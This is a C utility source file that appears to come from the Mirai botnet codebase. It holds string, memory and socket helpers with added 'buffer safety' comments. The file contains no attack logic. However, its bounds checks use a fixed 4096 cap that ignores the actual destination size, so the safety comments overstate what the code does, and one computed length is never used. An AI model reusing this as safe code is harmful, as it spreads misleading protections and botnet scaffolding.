#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>

#include "headers/includes.h"
#include "headers/util.h"

#define MAX_BUFFER_SIZE 4096

int util_strlen(char *str) {
    if (!str) return 0;

    int c = 0;
    while(*str++ != 0)
        c++;

    return c;
}

BOOL util_strncmp(char *str1, char *str2, int len) {
    if (!str1 || !str2) return FALSE;

    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if(l1 < len || l2 < len)
        return FALSE;

    while(len--) {
        if(*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

BOOL util_strcmp(char *str1, char *str2) {
    if (!str1 || !str2) return FALSE;

    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if(l1 != l2)
        return FALSE;

    while(l1--) {
        if(*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int util_strcpy(char *dst, char *src) {
    if (!dst || !src) return 0;
    
    int l = util_strlen(src);
    if (l <= 0) {
        dst[0] = '\0';
        return 0;
    }
    
    // 𝖡𝖴𝖥𝖥𝖤𝖱 𝖲𝖨𝖹𝖤 𝖲𝖠𝖥𝖤𝖳𝖸
    if (l >= MAX_BUFFER_SIZE - 1) {
        l = MAX_BUFFER_SIZE - 1;
    }
    
    util_memcpy(dst, src, l);
    dst[l] = '\0';
    return l;
}

void util_strcat(char *dest, char *src) {
    if (!dest || !src) return;
    
    size_t dest_len = strlen(dest);
    size_t src_len = strlen(src);
    
    // 𝖡𝖴𝖥𝖥𝖤𝖱 𝖮𝖵𝖤𝖱𝖥𝖫𝖮𝖶 𝖯𝖱𝖮𝖳𝖤𝖢𝖳𝖨𝖮𝖭
    if (dest_len + src_len >= MAX_BUFFER_SIZE - 1) {
        return;
    }
    
    memcpy(dest + dest_len, src, src_len + 1);
}

void util_memcpy(void *dst, void *src, int len) {
    if (!dst || !src || len <= 0) return;

    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    
    // 𝖡𝖴𝖥𝖥𝖤𝖱 𝖲𝖨𝖹𝖤 𝖲𝖠𝖥𝖤𝖳𝖸
    if (len > MAX_BUFFER_SIZE) {
        len = MAX_BUFFER_SIZE;
    }
    
    while(len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len) {
    if (!buf || len <= 0) return;
    
    // 𝖡𝖴𝖥𝖥𝖤𝖱 𝖲𝖨𝖹𝖤 𝖲𝖠𝖥𝖤𝖳𝖸
    if (len > MAX_BUFFER_SIZE) {
        len = MAX_BUFFER_SIZE;
    }
    
    char *zero = buf;
    while(len--)
        *zero++ = 0;
}

int util_atoi(char *str, int base) {
    if (!str) return 0;
    
    char *endptr;
    long result = strtol(str, &endptr, base);
    
    if (endptr == str || *endptr != '\0') {
        return 0;
    }
    
    if (result < INT_MIN || result > INT_MAX) {
        return 0;
    }
    
    return (int)result;
}

char *util_itoa(int value, int radix, char *string) {
    if (string == NULL)
        return NULL;

    if (value == 0) {
        string[0] = '0';
        string[1] = '\0';
        return string;
    }

    if (value != 0) {
        char scratch[34];
        int neg = 0;
        int offset = 0;
        int c = 0;
        unsigned int accum;

        offset = 32;
        scratch[33] = '\0';

        if (radix == 10 && value < 0) {
            neg = 1;
            accum = (unsigned int)(-value);
        } else {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum) {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        // 𝖡𝖴𝖥𝖥𝖤𝖱 𝖲𝖨𝖹𝖤 𝖲𝖠𝖥𝖤𝖳𝖸
        int len = 33 - offset;
        if (len >= MAX_BUFFER_SIZE) {
            len = MAX_BUFFER_SIZE - 1;
        }
        
        util_strcpy(string, &scratch[offset]);
    } else {
        string[0] = '0';
        string[1] = '\0';
    }

    return string;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len) {
    if (!buf || !mem || buf_len <= 0 || mem_len <= 0)
        return -1;

    if (mem_len > buf_len)
        return -1;

    int i = 0, matched = 0;

    for (i = 0; i < buf_len; i++) {
        if (buf[i] == mem[matched]) {
            if (++matched == mem_len)
                return i + 1;
        } else {
            matched = 0;
        }
    }

    return -1;
}

int util_stristr(char *haystack, int haystack_len, char *str) {
    if (!haystack || !str || haystack_len <= 0)
        return -1;

    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    if (str_len <= 0)
        return -1;

    while (haystack_len-- > 0) {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b) {
            if (++match_count == str_len)
                return (ptr - haystack);
        } else {
            match_count = 0;
        }
    }

    return -1;
}

ipv4_t util_local_addr(void) {
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        #ifdef DEBUG
            printf("[util] Failed to call socket(), errno = %d\n", errno);
        #endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        close(fd);
        return 0;
    }

    if (getsockname(fd, (struct sockaddr *)&addr, &addr_len) == -1) {
        close(fd);
        return 0;
    }

    close(fd);
    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd) {
    if (!buffer || buffer_size <= 1 || fd < 0)
        return NULL;

    int got = 0, total = 0;
    
    // 𝖡𝖴𝖥𝖥𝖤𝖱 𝖲𝖨𝖹𝖤 𝖲𝖠𝖥𝖤𝖳𝖸
    if (buffer_size > MAX_BUFFER_SIZE) {
        buffer_size = MAX_BUFFER_SIZE;
    }
    
    do {
        got = read(fd, buffer + total, 1);
        if (got == 1) {
            total++;
            if (*(buffer + (total - 1)) == '\n' || total >= buffer_size - 1)
                break;
        } else if (got < 0) {
            break;
        }
    } while (got == 1 && total < buffer_size - 1);

    if (total > 0) {
        buffer[total] = '\0';
        return buffer;
    }
    
    return NULL;
}

static inline int util_isupper(char c) {
    return (c >= 'A' && c <= 'Z');
}

static inline int util_isalpha(char c) {
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c) {
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

static inline int util_isdigit(char c) {
    return (c >= '0' && c <= '9');
}